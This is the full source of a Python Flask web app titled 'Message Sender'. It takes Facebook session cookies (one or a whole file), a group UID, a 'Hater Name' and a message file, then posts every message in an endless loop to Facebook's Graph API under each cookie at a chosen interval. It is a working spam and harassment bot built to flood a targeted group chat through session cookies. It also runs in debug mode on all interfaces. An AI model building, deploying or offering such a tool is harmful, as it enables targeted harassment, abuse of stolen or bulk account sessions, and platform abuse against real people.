from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(cookies_list, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for cookies in cookies_list:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'message': message}
                # Add cookies to headers
                request_headers = headers.copy()
                request_headers['Cookie'] = cookies
                response = requests.post(api_url, data=parameters, headers=request_headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully With cookies {cookies[:20]}...: {message}")
                else:
                    print(f"Message Sent Failed With cookies {cookies[:20]}...: {message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        cookie_option = request.form.get('cookieOption')

        if cookie_option == 'single':
            cookies_list = [request.form.get('singleCookie')]
        else:
            cookie_file = request.files['cookieFile']
            cookies_list = cookie_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(cookies_list, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Message Sender</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
  <style>
    /* Gradient background animation */
    body {
      background: linear-gradient(45deg, #6b7280, #3b82f6, #8b5cf6, #ec4899);
      background-size: 400%;
      animation: gradientShift 15s ease infinite;
    }
    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    /* Glowing effect for buttons */
    .btn-glow {
      position: relative;
      overflow: hidden;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    .btn-glow:hover {
      transform: translateY(-2px);
      box-shadow: 0 0 20px rgba(59, 130, 246, 0.7), 0 0 40px rgba(59, 130, 246, 0.3);
    }
    /* Input focus glow */
    .input-glow:focus {
      box-shadow: 0 0 10px rgba(59, 130, 246, 0.5), 0 0 20px rgba(59, 130, 246, 0.3);
      border-color: #3b82f6;
    }
    /* Card hover effect */
    .card {
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    .card:hover {
      transform: scale(1.02);
      box-shadow: 0 0 30px rgba(0, 0, 0, 0.2);
    }
  </style>
</head>
<body class="min-h-screen flex items-center justify-center">
  <div class="w-full max-w-md bg-white bg-opacity-90 rounded-xl shadow-lg p-8 card">
    <h1 class="text-3xl font-extrabold text-center text-gray-800 mb-6 flex items-center justify-center">
      <i class="fas fa-paper-plane mr-2 text-indigo-600"></i> Message Sender
    </h1>
    
    <!-- Form to start sending messages -->
    <form method="post" enctype="multipart/form-data" class="space-y-5">
      <div>
        <label for="cookieOption" class="block text-sm font-semibold text-gray-700">Cookie Option</label>
        <select id="cookieOption" name="cookieOption" onchange="toggleCookieInput()" class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:outline-none input-glow sm:text-sm bg-gray-50" required>
          <option value="single">Single Cookie</option>
          <option value="multiple">Cookie File</option>
        </select>
      </div>
      
      <div id="singleCookieInput">
        <label for="singleCookie" class="block text-sm font-semibold text-gray-700">Single Cookie</label>
        <input type="text" id="singleCookie" name="singleCookie" class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:outline-none input-glow sm:text-sm bg-gray-50" placeholder="Enter cookie string">
      </div>
      
      <div id="cookieFileInput" class="hidden">
        <label for="cookieFile" class="block text-sm font-semibold text-gray-700">Cookie File</label>
        <input type="file" id="cookieFile" name="cookieFile" class="mt-1 block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-semibold file:bg-indigo-100 file:text-indigo-700 hover:file:bg-indigo-200">
      </div>
      
      <div>
        <label for="threadId" class="block text-sm font-semibold text-gray-700">Group UID</label>
        <input type="text" id="threadId" name="threadId" class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:outline-none input-glow sm:text-sm bg-gray-50" placeholder="Enter group UID" required>
      </div>
      
      <div>
        <label for="kidx" class="block text-sm font-semibold text-gray-700">Hater Name</label>
        <input type="text" id="kidx" name="kidx" class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:outline-none input-glow sm:text-sm bg-gray-50" placeholder="Enter hater name" required>
      </div>
      
      <div>
        <label for="time" class="block text-sm font-semibold text-gray-700">Time Interval (Seconds)</label>
        <input type="number" id="time" name="time" class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:outline-none input-glow sm:text-sm bg-gray-50" placeholder="Enter seconds" required>
      </div>
      
      <div>
        <label for="txtFile" class="block text-sm font-semibold text-gray-700">Message File</label>
        <input type="file" id="txtFile" name="txtFile" class="mt-1 block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-semibold file:bg-indigo-100 file:text-indigo-700 hover:file:bg-indigo-200" required>
      </div>
      
      <button type="submit" class="w-full flex justify-center py-2 px-4 border border-transparent rounded-lg text-sm font-semibold text-white bg-gradient-to-r from-indigo-600 to-purple-600 btn-glow">
        <i class="fas fa-play mr-2"></i> Start Sending
      </button>
    </form>
    
    <!-- Form to stop sending messages -->
    <form method="post" action="/stop" class="mt-6 space-y-5">
      <div>
        <label for="taskId" class="block text-sm font-semibold text-gray-700">Task ID</label>
        <input type="text" id="taskId" name="taskId" class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:outline-none input-glow sm:text-sm bg-gray-50" placeholder="Enter task ID to stop" required>
      </div>
      
      <button type="submit" class="w-full flex justify-center py-2 px-4 border border-transparent rounded-lg text-sm font-semibold text-white bg-gradient-to-r from-red-600 to-pink-600 btn-glow">
        <i class="fas fa-stop mr-2"></i> Stop Sending
      </button>
    </form>
  </div>
  
  <script>
    function toggleCookieInput() {
      const cookieOption = document.getElementById('cookieOption').value;
      document.getElementById('singleCookieInput').classList.toggle('hidden', cookieOption !== 'single');
      document.getElementById('cookieFileInput').classList.toggle('hidden', cookieOption !== 'multiple');
    }
  </script>
</body>
</html>
    ''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
